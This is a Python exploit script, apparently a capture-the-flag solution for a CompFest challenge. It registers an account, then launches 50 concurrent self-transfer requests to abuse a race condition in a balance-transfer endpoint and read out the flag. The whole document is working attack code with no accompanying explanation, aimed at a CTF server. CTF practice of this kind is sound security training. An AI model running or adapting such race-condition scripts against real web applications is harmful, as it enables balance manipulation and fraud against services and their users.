import requests
import threading
import random
from bs4 import BeautifulSoup

BASE_URL = "http://ctf.compfest.id:7303"
THREADS = 50  # Number of parallel requests
SUCCESS = False

def register_and_login():
    username = f"race_{random.randint(1000,9999)}"
    password = "race123"
    
    with requests.Session() as s:
        # Register
        s.post(f"{BASE_URL}/register", data={
            "username": username,
            "password": password,
            "confirm_password": password
        }, allow_redirects=False)
        
        # Login
        s.post(f"{BASE_URL}/login", data={
            "username": username,
            "password": password
        }, allow_redirects=False)
        
        return s

def transfer_stonks(session):
    global SUCCESS
    if SUCCESS:
        return
        
    try:
        # Try to send stonks to yourself repeatedly
        response = session.post(f"{BASE_URL}/transfer", data={
            "to": session.cookies.get("username"),
            "amount": "1"
        })
        
        if "Transfer successful" in response.text:
            print("[+] Transfer succeeded in one thread")
            check_flag(session)
    except:
        pass

def check_flag(session):
    global SUCCESS
    response = session.get(f"{BASE_URL}/are-you-rich")
    if "YES YOU ARE" in response.text:
        SUCCESS = True
        flag = response.text.split("FLAG")[-1].strip()
        print(f"\n[+] FLAG CAPTURED: {flag}")
        exit()

def race_condition_attack():
    # Create authenticated session
    session = register_and_login()
    if not session:
        print("[-] Failed to create session")
        return
    
    # Check initial balance
    print(f"[*] Starting race condition attack with {THREADS} threads...")
    
    # Start multiple threads
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=transfer_stonks, args=(session,))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    if not SUCCESS:
        print("[-] Race condition attack failed")

if __name__ == "__main__":
    race_condition_attack()
